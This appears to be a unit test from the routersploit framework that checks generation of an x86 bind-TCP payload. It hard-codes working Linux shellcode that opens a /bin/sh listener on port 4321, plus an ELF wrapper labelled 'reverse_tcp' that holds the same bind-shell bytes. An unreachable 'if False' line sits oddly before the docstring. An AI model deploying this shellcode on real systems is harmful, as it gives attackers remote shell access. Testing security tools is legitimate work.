from routersploit.modules.payloads.x86.bind_tcp import Payload
bind_tcp = b'1\xdb\xf7\xe3SCSj\x02\x89\xe1\xb0f\xcd\x80[^Rh\x02\x00\x10\xe1j\x10QP\x89\xe1jfX\xcd\x80\x89A\x04\xb3\x04\xb0f\xcd\x80C\xb0f\xcd\x80\x93Yj?X\xcd\x80Iy\xf8h//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80'
elf_x86_reverse_tcp = b'\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00T\x80\x04\x084\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x00 \x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08\xa2\x00\x00\x00\xf0\x00\x00\x00\x07\x00\x00\x00\x00\x10\x00\x001\xdb\xf7\xe3SCSj\x02\x89\xe1\xb0f\xcd\x80[^Rh\x02\x00\x10\xe1j\x10QP\x89\xe1jfX\xcd\x80\x89A\x04\xb3\x04\xb0f\xcd\x80C\xb0f\xcd\x80\x93Yj?X\xcd\x80Iy\xf8h//shh/bin\x89\xe3PS\x89\xe1\xb0\x0b\xcd\x80'

def test_payload_generation():
    if False:
        return 10
    ' Test scenario - payload generation '
    payload = Payload()
    payload.rport = 4321
    assert payload.generate() == bind_tcp